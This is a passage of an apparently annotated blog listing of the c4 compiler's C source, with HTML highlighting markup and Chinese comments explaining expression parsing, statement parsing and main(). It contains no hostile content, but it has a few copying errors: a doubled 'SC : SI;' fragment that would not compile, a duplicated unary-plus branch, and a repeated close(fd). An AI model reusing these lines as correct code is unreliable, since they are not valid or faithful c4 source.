class="string">      next();</span></span><br><span class="line"><span class="string">      t = 0;//形參數</span></span><br><span class="line"><span class="string">      while (tk != &#x27;)&#x27;) &#123; expr(Assign); *++e = PSH; ++t; if (tk == &#x27;,&#x27;) next(); &#125;//計算實參的值，壓棧(傳參</span></span><br><span class="line"><span class="string">      next();</span></span><br><span class="line"><span class="string">      if (d[Class] == Sys) *++e = d[Val];</span></span><br><span class="line"><span class="string">      else if (d[Class] == Fun) &#123; *++e = JSR; *++e = d[Val]; &#125;//系統呼叫,如malloc,memset,d[val]為opcode</span></span><br><span class="line"><span class="string">//使用者定義函數,d[Val]為函數入口位址</span></span><br><span class="line"><span class="string">      else &#123; printf(&quot;</span>%d: bad function call\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">      if (t) &#123; *++e = ADJ; *++e = t; &#125;//因為用棧傳參,調整棧</span></span><br><span class="line"><span class="string">      ty = d[Type];//函數傳回值類型</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    else if (d[Class] == Num) &#123; *++e = IMM; *++e = d[Val]; ty = INT; &#125;//d[Class] == Num,處理枚舉(只有枚舉是Class==Num)</span></span><br><span class="line"><span class="string">/*</span></span><br><span class="line"><span class="string">第一個 while 處理參數(argument)的部分，並且產生 push into stack 的 IR；</span></span><br><span class="line"><span class="string">接下來的兩個 if 分別處理system call and function call：</span></span><br><span class="line"><span class="string">system call 不做 binding 的動作，只保留 Symbol name；</span></span><br><span class="line"><span class="string">function call 則使用 JSR 指令來跳躍到該函式的真實位址。</span></span><br><span class="line"><span class="string">最後根據參數的數量調整 stack frame pointer。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">*//變數</span></span><br><span class="line"><span class="string">//變數先取地址然後再LC/LI</span></span><br><span class="line"><span class="string">    else &#123;</span></span><br><span class="line"><span class="string">      if (d[Class] == Loc) &#123; *++e = LEA; *++e = loc - d[Val]; &#125;//取位址,d[Val]是局部變數偏移量</span></span><br><span class="line"><span class="string">      else if (d[Class] == Glo) &#123; *++e = IMM; *++e = d[Val]; &#125;//取位址,d[Val] 是全域變數指標</span></span><br><span class="line"><span class="string">      else &#123; printf(&quot;</span>%d: undefined variable\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">      *++e = ((ty = d[Type]) == CHAR) ? LC : LI;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">// 6、解析強制轉換，取得轉換的型別，直接修改type的值</span></span><br><span class="line"><span class="string">  else if (tk == &#x27;(&#x27;) &#123;//括號處理 </span></span><br><span class="line"><span class="string">    next();</span></span><br><span class="line"><span class="string">    if (tk == Int || tk == Char) &#123;//強制型別轉換</span></span><br><span class="line"><span class="string">      t = (tk == Int) ? INT : CHAR; next();</span></span><br><span class="line"><span class="string">      while (tk == Mul) &#123; next(); t = t + PTR; &#125;//指針</span></span><br><span class="line"><span class="string">//第一個 if 處理 type casting，else 則是處理括號的優先權。</span></span><br><span class="line"><span class="string">      if (tk == &#x27;)&#x27;) next(); else &#123; printf(&quot;</span>%d: bad cast\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">      expr(Inc);//高優先權</span></span><br><span class="line"><span class="string">      ty = t;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    else &#123;//一般語法括號</span></span><br><span class="line"><span class="string">      expr(Assign);</span></span><br><span class="line"><span class="string">      if (tk == &#x27;)&#x27;) next(); else &#123; printf(&quot;</span>%d: close paren expected\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">// 7.解析指標取值</span></span><br><span class="line"><span class="string">  else if (tk == Mul) &#123;//取指標指向值</span></span><br><span class="line"><span class="string">//recursive-descent call expr()，然後 check type 是否為一階 pointer type (semantic analyzer)，dereference semantic analyze 的過程為 ty=ty-PTR</span></span><br><span class="line"><span class="string">    next(); expr(Inc);//高優先權</span></span><br><span class="line"><span class="string">    if (ty &gt; INT) ty = ty - PTR; else &#123; printf(&quot;</span>%d: bad dereference\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">    *++e = (ty == CHAR) ? LC : LI;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &#125;// 8、解析取址操作</span></span><br><span class="line"><span class="string">  else if (tk == And) &#123;//address-of 的部分直接把 LI/LC command 砍掉，register 所存的就會是位址；相較於 derefernece 而言，register 存的是真正的值。//&amp;,取位址操作</span></span><br><span class="line"><span class="string">    next(); expr(Inc);</span></span><br><span class="line"><span class="string">    if (*e == LC || *e == LI) --e; else &#123; printf(&quot;</span>%d: bad address-of\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">    ty = ty + PTR;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">// 9、解析運算符號表達式</span></span><br><span class="line"><span class="string">//expr() 回傳的值會存在 register，因此這邊要產生的 IR 要先把結果 Push 回 stack，然後再設定 register value，最後做運算，結果會 restore into register。</span></span><br><span class="line"><span class="string">  else if (tk == &#x27;!&#x27;) &#123; next(); expr(Inc); *++e = PSH; *++e = IMM; *++e = 0; *++e = EQ; ty = INT; &#125;//!x相當於x==0</span></span><br><span class="line"><span class="string">  else if (tk == &#x27;~&#x27;) &#123; next(); expr(Inc); *++e = PSH; *++e = IMM; *++e = -1; *++e = XOR; ty = INT; &#125;//~x 相當於x ^ -1</span></span><br><span class="line"><span class="string">  else if (tk == Add) &#123; next(); expr(Inc); ty = INT; &#125;</span></span><br><span class="line"><span class="string">  //處理 expr 開頭是 +/- 的 case。</span></span><br><span class="line"><span class="string">	else if (tk == Add) &#123; next(); expr(Inc); ty = INT; &#125;</span></span><br><span class="line"><span class="string">  else if (tk == Sub) &#123;</span></span><br><span class="line"><span class="string">    next(); *++e = IMM;//數值,取負</span></span><br><span class="line"><span class="string">    if (tk == Num) &#123; *++e = -ival; next(); &#125;</span></span><br><span class="line"><span class="string"> else &#123; *++e = -1; *++e = PSH; expr(Inc); *++e = MUL; &#125;//乘-1</span></span><br><span class="line"><span class="string">    ty = INT;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">// 10、解析自增、自減</span></span><br><span class="line"><span class="string">//pre-increment/pre-decrement：透過插入 Push command 將 register 的值存入 stack 中。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//expr() 第一部分處理的都是 expression 開頭的部分，接著第二部分將會展示如何使用 operator-precedence 處理 operator 優先權。</span></span><br><span class="line"><span class="string">  else if (tk == Inc || tk == Dec) &#123;//處理++x,--x//x--,x++在後面處理</span></span><br><span class="line"><span class="string">    t = tk; next(); expr(Inc);</span></span><br><span class="line"><span class="string">//處理++x,--x</span></span><br><span class="line"><span class="string">    if (*e == LC) &#123; *e = PSH; *++e = LC; &#125;//位址壓棧(下面SC/SI用到),再取數</span></span><br><span class="line"><span class="string">    else if (*e == LI) &#123; *e = PSH; *++e = LI; &#125;</span></span><br><span class="line"><span class="string">    else &#123; printf(&quot;</span>%d: bad lvalue in pre-increment\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">    *++e = PSH;//將數值壓棧</span></span><br><span class="line"><span class="string">    *++e = IMM; *++e = (ty &gt; PTR) ? sizeof(int) : sizeof(char);//指標則加減一字,否則加減1</span></span><br><span class="line"><span class="string">    *++e = (t == Inc) ? ADD : SUB;//運算</span></span><br><span class="line"><span class="string">    *++e = (ty == CHAR) ? SC : SI;//存回變數</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  else &#123; printf(&quot;</span>%d: bad expression\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">//使用 switch，但是 c4 並不支援 switch，因此才會採用多個 if-else。</span></span><br><span class="line"><span class="string">//Operator precedence (parsing)，主要處理四則運算。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//爬山法</span></span><br><span class="line"><span class="string">  //tk為ASCII碼的都不會超過Num=128</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  while (tk &gt;= lev) &#123; // &quot;</span>precedence climbing<span class="string">&quot; or &quot;</span>Top Down Operator Precedence<span class="string">&quot; method</span></span><br><span class="line"><span class="string">    t = ty;//ty在遞迴過程中可能會改變,所以備份目前處理的表達式類型</span></span><br><span class="line"><span class="string">// 11、解析賦值運算</span></span><br><span class="line"><span class="string">//將暫存器的位址 push 到 stack 中，做完後面的運算後，結果通常都會在暫存器中，因此透過 SC/SI 將暫存器的值存到 stack 中的位址。</span></span><br><span class="line"><span class="string">    if (tk == Assign) &#123;//賦值</span></span><br><span class="line"><span class="string">      next();</span></span><br><span class="line"><span class="string">      if (*e == LC || *e == LI) *e = PSH;//左邊被tk=Id中變數部分處理過了,將位址壓棧</span></span><br><span class="line"><span class="string">			 else &#123; printf(&quot;</span>%d: bad lvalue in assignment\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">      expr(Assign); *++e = ((ty = t) == CHAR) ? SC : SI;SC : SI;//取得右值expr的值,作為a=expr的結果</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">//處理類似 x=y?a:b 判斷式，保留 BZ 指令後面要填位址的空間</span></span><br><span class="line"><span class="string">//然後進行 recursive descent parser for expression，然後塞入 JMP 指令</span></span><br><span class="line"><span class="string">//且一樣保留後面要填位址的空間，展開最後的 expression 後，再填入要 JMP 的位址。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 12、解析三目運算符</span></span><br><span class="line"><span class="string">    else if (tk == Cond) &#123;//x?a:b和if類似,除了不能沒有else</span></span><br><span class="line"><span class="string">      next();</span></span><br><span class="line"><span class="string">      *++e = BZ; d = ++e;</span></span><br><span class="line"><span class="string">      expr(Assign);</span></span><br><span class="line"><span class="string">      if (tk == &#x27;:&#x27;) next(); else &#123; printf(&quot;</span>%d: conditional missing colon\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">      *d = (int)(e + 3); *++e = JMP; d = ++e;</span></span><br><span class="line"><span class="string">      expr(Cond);</span></span><br><span class="line"><span class="string">      *d = (int)(e + 1);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">//通常牽扯到 Branch/Jump 指令的都會使用類似這種方法：先保留目標位址，等待後面的指令都確定後，才會知道目標位址。</span></span><br><span class="line"><span class="string">    else if (tk == Lor) &#123; next(); *++e = BNZ; d = ++e; expr(Lan); *d = (int)(e + 1); ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Lan) &#123; next(); *++e = BZ;  d = ++e; expr(Or);  *d = (int)(e + 1); ty = INT; &#125;</span></span><br><span class="line"><span class="string"> /*</span></span><br><span class="line"><span class="string">這邊運算子的概念就是先將數值 push into stack frame，然後利用 operator-precedence</span></span><br><span class="line"><span class="string">展開後面的 expression，展開的結果通常會存在 register，</span></span><br><span class="line"><span class="string">運算相關的 command 通常是拿 register 和 stack 做運算，然後將結果存回 register。</span></span><br><span class="line"><span class="string">*/</span></span><br><span class="line"><span class="string">		else if (tk == Or)  &#123; next(); *++e = PSH; expr(Xor); *++e = OR;  ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Xor) &#123; next(); *++e = PSH; expr(And); *++e = XOR; ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == And) &#123; next(); *++e = PSH; expr(Eq);  *++e = AND; ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Eq)  &#123; next(); *++e = PSH; expr(Lt);  *++e = EQ;  ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Ne)  &#123; next(); *++e = PSH; expr(Lt);  *++e = NE;  ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Lt)  &#123; next(); *++e = PSH; expr(Shl); *++e = LT;  ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Gt)  &#123; next(); *++e = PSH; expr(Shl); *++e = GT;  ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Le)  &#123; next(); *++e = PSH; expr(Shl); *++e = LE;  ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Ge)  &#123; next(); *++e = PSH; expr(Shl); *++e = GE;  ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Shl) &#123; next(); *++e = PSH; expr(Add); *++e = SHL; ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Shr) &#123; next(); *++e = PSH; expr(Add); *++e = SHR; ty = INT; &#125;</span></span><br><span class="line"><span class="string">    //這邊同時處理 pointer 的加法：因為一次 add 一個「單位」。</span></span><br><span class="line"><span class="string">		//int *a;</span></span><br><span class="line"><span class="string">		//c=a+b;</span></span><br><span class="line"><span class="string">		else if (tk == Add) &#123;</span></span><br><span class="line"><span class="string">      next(); *++e = PSH; expr(Mul);</span></span><br><span class="line"><span class="string">      if ((ty = t) &gt; PTR) &#123; *++e = PSH; *++e = IMM; *++e = sizeof(int); *++e = MUL;  &#125;//處理指針</span></span><br><span class="line"><span class="string">      *++e = ADD;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">//發現多了一個 if 判斷式，這是在處理指標相減計算中間的個數。</span></span><br><span class="line"><span class="string">    else if (tk == Sub) &#123;</span></span><br><span class="line"><span class="string">      next(); *++e = PSH; expr(Mul);</span></span><br><span class="line"><span class="string">      if (t &gt; PTR &amp;&amp; t == ty) &#123; *++e = SUB; *++e = PSH; *++e = IMM; *++e = sizeof(int); *++e = DIV; ty = INT; &#125;//指標相減</span></span><br><span class="line"><span class="string">      else if ((ty = t) &gt; PTR) &#123; *++e = PSH; *++e = IMM; *++e = sizeof(int); *++e = MUL; *++e = SUB; &#125;//指標減數值</span></span><br><span class="line"><span class="string">      else *++e = SUB;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Mul) &#123; next(); *++e = PSH; expr(Inc); *++e = MUL; ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Div) &#123; next(); *++e = PSH; expr(Inc); *++e = DIV; ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Mod) &#123; next(); *++e = PSH; expr(Inc); *++e = MOD; ty = INT; &#125;</span></span><br><span class="line"><span class="string">//post-increment 的做法就是先改變 variable 在 stack 中的值，然後再回復成原來的值，並且存在 register 中，最後再進行運算。</span></span><br><span class="line"><span class="string">    else if (tk == Inc || tk == Dec) &#123;</span></span><br><span class="line"><span class="string">      if (*e == LC) &#123; *e = PSH; *++e = LC; &#125;</span></span><br><span class="line"><span class="string">      else if (*e == LI) &#123; *e = PSH; *++e = LI; &#125;</span></span><br><span class="line"><span class="string">      else &#123; printf(&quot;</span>%d: bad lvalue in post-increment\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">      *++e = PSH; *++e = IMM; *++e = (ty &gt; PTR) ? sizeof(int) : sizeof(char);</span></span><br><span class="line"><span class="string">      *++e = (tk == Inc) ? ADD : SUB;//先自增/自減</span></span><br><span class="line"><span class="string">      *++e = (ty == CHAR) ? SC : SI;//存到記憶體裡</span></span><br><span class="line"><span class="string">      *++e = PSH; *++e = IMM; *++e = (ty &gt; PTR) ? sizeof(int) : sizeof(char);</span></span><br><span class="line"><span class="string">      *++e = (tk == Inc) ? SUB : ADD;//再反轉操作，保證後自增/自減不影響這次表達式的求值 //PS:我終於知道哪些a=1;b=a+++a++為啥等於3了</span></span><br><span class="line"><span class="string">      next();</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">//這部分是處理 array index 的取值到 register 中，中間必須處理一個 array 單位乘以 index，以計算最終位址。</span></span><br><span class="line"><span class="string">    else if (tk == Brak) &#123;// 備份下標</span></span><br><span class="line"><span class="string">      next(); *++e = PSH; expr(Assign);//儲存備份配額,計算下標</span></span><br><span class="line"><span class="string">      if (tk == &#x27;]&#x27;) next(); else &#123; printf(&quot;</span>%d: close bracket expected\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">      if (t &gt; PTR) &#123; *++e = PSH; *++e = IMM; *++e = sizeof(int); *++e = MUL;  &#125;//t==PTR時是Char,Char = 0</span></span><br><span class="line"><span class="string">      else if (t &lt; PTR) &#123; printf(&quot;</span>%d: pointer type expected\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">      *++e = ADD;</span></span><br><span class="line"><span class="string">      *++e = ((ty = t - PTR) == CHAR) ? LC : LI;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    else &#123; printf(&quot;</span>%d: compiler error tk=%d\n<span class="string">&quot;, line, tk); exit(-1); &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">//處理 “if-else”, “while”, “return”, “&#123;&#125;”, “;”</span></span><br><span class="line"><span class="string">//語句分析</span></span><br><span class="line"><span class="string">void stmt()</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  int *a, *b;</span></span><br><span class="line"><span class="string">//*a:代表條件為false時跳到的語句</span></span><br><span class="line"><span class="string">  //*b:為了防止順序執行if-else程式碼,所以執行了true部分時應跳過false部分</span></span><br><span class="line"><span class="string">// 1、解析if語句</span></span><br><span class="line"><span class="string">  if (tk == If) &#123;</span></span><br><span class="line"><span class="string">    next();</span></span><br><span class="line"><span class="string">    if (tk == &#x27;(&#x27;) </span></span><br><span class="line"><span class="string">		next(); </span></span><br><span class="line"><span class="string">		else &#123; printf(&quot;</span>%d: open paren expected\n<span class="string">&quot;, line); </span></span><br><span class="line"><span class="string">		exit(-1); &#125;</span></span><br><span class="line"><span class="string">    expr(Assign);</span></span><br><span class="line"><span class="string">    if (tk == &#x27;)&#x27;) </span></span><br><span class="line"><span class="string">		next(); </span></span><br><span class="line"><span class="string">		else &#123; </span></span><br><span class="line"><span class="string">		printf(&quot;</span>%d: close paren expected\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">    *++e = BZ;//branch if zero</span></span><br><span class="line"><span class="string">		 b = ++e;//branch address pointer</span></span><br><span class="line"><span class="string">    stmt();// 繼續分析</span></span><br><span class="line"><span class="string">    if (tk == Else) &#123;</span></span><br><span class="line"><span class="string">      *b = (int)(e + 3); // e + 3 位置是else 起始位置</span></span><br><span class="line"><span class="string">			*++e = JMP; </span></span><br><span class="line"><span class="string">			b = ++e; // if 語句 else 之前插入 JMP 跳過Else 部分 // JMP目標</span></span><br><span class="line"><span class="string">			</span></span><br><span class="line"><span class="string">      next();</span></span><br><span class="line"><span class="string">      stmt();//分析else 部分</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    *b = (int)(e + 1);//if 語句結束,無論是if BZ 跳轉目標或是 else 之前的JMP的跳轉目標</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">// 2、解析while語句</span></span><br><span class="line"><span class="string">  else if (tk == While) &#123;//循環</span></span><br><span class="line"><span class="string">    next();</span></span><br><span class="line"><span class="string">    a = e + 1;// While 迴圈體起始位址</span></span><br><span class="line"><span class="string">    if (tk == &#x27;(&#x27;) next(); else &#123; printf(&quot;</span>%d: open paren expected\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">    expr(Assign);</span></span><br><span class="line"><span class="string">    if (tk == &#x27;)&#x27;) next(); else &#123; printf(&quot;</span>%d: close paren expected\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">    *++e = BZ;</span></span><br><span class="line"><span class="string">		 b = ++e;//b = While 語句結束後位址</span></span><br><span class="line"><span class="string">    stmt();//處理While 語句體</span></span><br><span class="line"><span class="string">    *++e = JMP; *++e = (int)a;//無條件跳到While語句開始(包含循環條件的程式碼),實作循環</span></span><br><span class="line"><span class="string">    *b = (int)(e + 1);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">// 3.解析return語句</span></span><br><span class="line"><span class="string">  else if (tk == Return) &#123;</span></span><br><span class="line"><span class="string">    next();</span></span><br><span class="line"><span class="string">    if (tk != &#x27;;&#x27;) expr(Assign);// 3.解析return語句</span></span><br><span class="line"><span class="string">    *++e = LEV;// 銷毀函式呼叫棧</span></span><br><span class="line"><span class="string">    if (tk == &#x27;;&#x27;) next(); else &#123; printf(&quot;</span>%d: semicolon expected\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">//解析複合語句</span></span><br><span class="line"><span class="string">  else if (tk == &#x27;&#123;&#x27;) &#123;</span></span><br><span class="line"><span class="string">    next();</span></span><br><span class="line"><span class="string">    while (tk != &#x27;&#125;&#x27;) stmt();//複合語句</span></span><br><span class="line"><span class="string">    next();</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">// 5、解析單句</span></span><br><span class="line"><span class="string">  else if (tk == &#x27;;&#x27;) &#123;</span></span><br><span class="line"><span class="string">    next();</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  else &#123;</span></span><br><span class="line"><span class="string">    expr(Assign);;//一般的語句認為是賦值語句/表達式</span></span><br><span class="line"><span class="string">    if (tk == &#x27;;&#x27;) next(); else &#123; printf(&quot;</span>%d: semicolon expected\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">int main(int argc, char **argv)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	//fd file descriptor 檔案描述</span></span><br><span class="line"><span class="string">  //bt basetype</span></span><br><span class="line"><span class="string">  //poolsz 一系列池的大小</span></span><br><span class="line"><span class="string">  //ty type 記錄目前標識的類型</span></span><br><span class="line"><span class="string">  int fd, bt, ty, poolsz, *idmain;</span></span><br><span class="line"><span class="string">  int *pc, *sp, *bp, a, cycle; // vm registers 虛擬器的暫存器</span></span><br><span class="line"><span class="string">  int i, *t; // temps</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  --argc; ++argv;</span></span><br><span class="line"><span class="string">  if (argc &gt; 0 &amp;&amp; **argv == &#x27;-&#x27; &amp;&amp; (*argv)[1] == &#x27;s&#x27;) &#123; src = 1; --argc; ++argv; &#125;</span></span><br><span class="line"><span class="string">  if (argc &gt; 0 &amp;&amp; **argv == &#x27;-&#x27; &amp;&amp; (*argv)[1] == &#x27;d&#x27;) &#123; debug = 1; --argc; ++argv; &#125;</span></span><br><span class="line"><span class="string">  if (argc &lt; 1) &#123; printf(&quot;</span>usage: c4 [-s] [-d] file ...\n<span class="string">&quot;); return -1; &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  if ((fd = open(*argv, 0)) &lt; 0) &#123; printf(&quot;</span>could not open(%s)\n<span class="string">&quot;, *argv); return -1; &#125;</span></span><br><span class="line"><span class="string">//Symbol Table and Stack Frame 的大小都是 256KB。//開啟原始檔並讀取到src_pos中</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sym：symbol table.</span></span><br><span class="line"><span class="string">e：Assembly Code(IR) output.</span></span><br><span class="line"><span class="string">le：last print IR.</span></span><br><span class="line"><span class="string">sp：Stack Frame.</span></span><br><span class="line"><span class="string">data：data section.</span></span><br><span class="line"><span class="string">*/</span></span><br><span class="line"><span class="string">//poolsz = 256*1024; // 大小</span></span><br><span class="line"><span class="string">  //給各區域申請空間</span></span><br><span class="line"><span class="string">  poolsz = 256*1024; // arbitrary size</span></span><br><span class="line"><span class="string">  if (!(sym = malloc(poolsz))) &#123; printf(&quot;</span>could not <span class="built_in">malloc</span>(%d) symbol area\n<span class="string">&quot;, poolsz); return -1; &#125;//符號表</span></span><br><span class="line"><span class="string">  if (!(le = e = malloc(poolsz))) &#123; printf(&quot;</span>could not <span class="built_in">malloc</span>(%d) text area\n<span class="string">&quot;, poolsz); return -1; &#125;//文字段</span></span><br><span class="line"><span class="string">  if (!(data = malloc(poolsz))) &#123; printf(&quot;</span>could not <span class="built_in">malloc</span>(%d) data area\n<span class="string">&quot;, poolsz); return -1; &#125;//資料段</span></span><br><span class="line"><span class="string">  if (!(sp = malloc(poolsz))) &#123; printf(&quot;</span>could not <span class="built_in">malloc</span>(%d) <span class="built_in">stack</span> area\n<span class="string">&quot;, poolsz); return -1; &#125;//棧</span></span><br><span class="line"><span class="string">// 起始位置</span></span><br><span class="line"><span class="string">  memset(sym,  0, poolsz);</span></span><br><span class="line"><span class="string">  memset(e,    0, poolsz);</span></span><br><span class="line"><span class="string">  memset(data, 0, poolsz);</span></span><br><span class="line"><span class="string">//根據 enum 從 Char 到 While 一一加入 symbol table 中。</span></span><br><span class="line"><span class="string">//在 next() function 中 id 將會指到 sym =&gt; id = sym; // unwind symbol table locals.</span></span><br><span class="line"><span class="string">// 用詞法分析器先把這些關鍵字放進符號表</span></span><br><span class="line"><span class="string">  p = &quot;</span><span class="type">char</span> <span class="keyword">else</span> <span class="keyword">enum</span> <span class="keyword">if</span> <span class="type">int</span> <span class="keyword">return</span> <span class="keyword">sizeof</span> <span class="keyword">while</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">      &quot;</span>open read close <span class="built_in">printf</span> <span class="built_in">malloc</span> <span class="built_in">free</span> <span class="built_in">memset</span> <span class="built_in">memcmp</span> <span class="built_in">exit</span> <span class="type">void</span> main<span class="string">&quot;;</span></span><br><span class="line"><span class="string">// 預先把關鍵字加進去,id[Tk]修改為和Enum一致</span></span><br><span class="line"><span class="string">  i = Char; while (i &lt;= While) &#123; next(); id[Tk] = i++; &#125; // add keywords to symbol table 從 next() 新增 id(symbol) 之後，會再重新設定 token enum value。</span></span><br><span class="line"><span class="string">//預先把[庫]裡定義的符號(系統函數等) 加進去 Class 賦值為Sys</span></span><br><span class="line"><span class="string">//接下來處理 system call library，從 next() 新增 id(symbol) 之後，會再設定 token class, type, and value。</span></span><br><span class="line"><span class="string">  i = OPEN; while (i &lt;= EXIT) &#123; next(); id[Class] = Sys; id[Type] = INT; id[Val] = i++; &#125; // add library to symbol table</span></span><br><span class="line"><span class="string">// void 認為是char，不支援void類型，將void轉為char</span></span><br><span class="line"><span class="string">  //處理 void and main keyword，另外使用 idmain 紀錄 main `在 symbol table 的位置。</span></span><br><span class="line"><span class="string">	next(); id[Tk] = Char; // handle void type</span></span><br><span class="line"><span class="string">// 記錄main函數的符號id</span></span><br><span class="line"><span class="string">  next(); idmain = id; //指向main函數對應的符號表條目</span></span><br><span class="line"><span class="string">//讀取 source code 到 p(lp=p) 所指的位址，並且關閉 FD。</span></span><br><span class="line"><span class="string">  if (!(lp = p = malloc(poolsz))) &#123; printf(&quot;</span>could not <span class="built_in">malloc</span>(%d) source area\n<span class="string">&quot;, poolsz); return -1; &#125;</span></span><br><span class="line"><span class="string">  if ((i = read(fd, p, poolsz-1)) &lt;= 0) &#123; printf(&quot;</span>read() returned %d\n<span class="string">&quot;, i); return -1; &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	p[i] = 0;//字串結尾置0</span></span><br><span class="line"><span class="string">  close(fd);//釋放資源</span></span><br><span class="line"><span class="string">  p[i] = 0;</span></span><br><span class="line"><span class="string">  close(fd);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  // parse declarations</span></span><br><span class="line"><span class="string">//在 main() 中，以上面這個 while loop 來 parsing tokens，直到 tk=‘\0’。</span></span><br><span class="line"><span class="string">// 語法分析</span></span><br><span class="line"><span class="string">  line = 1;</span></span><br><span class="line"><span class="string">  next();</span></span><br><span class="line"><span class="string">  while (tk) &#123;</span></span><br><span class="line"><span class="string">//前面兩個 if 分別處理 INT and CHAR，最後一個 if 處理 enum：使用 local variable i 來處理 value of enum id。</span></span><br><span class="line"><span class="string">    bt = INT; // basetype</span></span><br><span class="line"><span class="string">    if (tk == Int) next();//已經有bt == INT</span></span><br><span class="line"><span class="string">    else if (tk == Char) &#123; next(); bt = CHAR; &#125;//char 變數;</span></span><br><span class="line"><span class="string">    else if (tk == Enum) &#123;</span></span><br><span class="line"><span class="string">      next();</span></span><br><span class="line"><span class="string">      if (tk != &#x27;&#123;&#x27;) next();// 似乎忽略了枚舉名,例如 enum xxx&#123;&#125;，去除多餘的空格</span></span><br><span class="line"><span class="string">      if (tk == &#x27;&#123;&#x27;) &#123;</span></span><br><span class="line"><span class="string">        next();</span></span><br><span class="line"><span class="string">        i = 0;//Enum 預設從0 開始</span></span><br><span class="line"><span class="string">        while (tk != &#x27;&#125;&#x27;) &#123;//enum賦值有兩種方式,一種預設從0開始,還有一種可以自己進行賦值</span></span><br><span class="line"><span class="string">				//情況1</span></span><br><span class="line"><span class="string">          if (tk != Id) &#123; printf(&quot;</span>%d: bad <span class="keyword">enum</span> identifier %d\n<span class="string">&quot;, line, tk); return -1; &#125;//不是Identifier 就出錯</span></span><br><span class="line"><span class="string">          next();</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">          if (tk == Assign) &#123;// 發現賦值語句 如 enum &#123; Num = 128 &#125;;</span></span><br><span class="line"><span class="string">            next();</span></span><br><span class="line"><span class="string">            if (tk != Num) &#123; 